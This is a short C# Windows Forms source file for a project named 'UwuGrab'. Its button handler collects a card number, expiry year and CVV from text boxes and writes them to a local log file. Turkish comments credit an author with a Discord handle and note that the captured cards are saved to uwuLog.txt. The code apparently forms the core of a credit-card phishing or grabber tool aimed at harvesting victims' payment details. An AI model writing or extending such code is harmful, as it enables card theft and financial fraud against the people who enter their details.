using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace UwuGrab
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void gunaAdvenceButton1_Click(object sender, EventArgs e)
        {
            string kartNo = gunaLineTextBox1.Text;
            string kartYil = gunaLineTextBox3.Text;
            string kartCVV = gunaLineTextBox4.Text;

            System.IO.File.WriteAllText("uwuLog.txt", kartNo + "|" + kartYil + "|" + kartCVV +"\n");

            //weinzed tarafından yapılmıştır.
            // Discord : weinzed#1337.
            //Kartlar program içerisindeki uwuLog.txt'ye kaydolur.
        }
    }
}
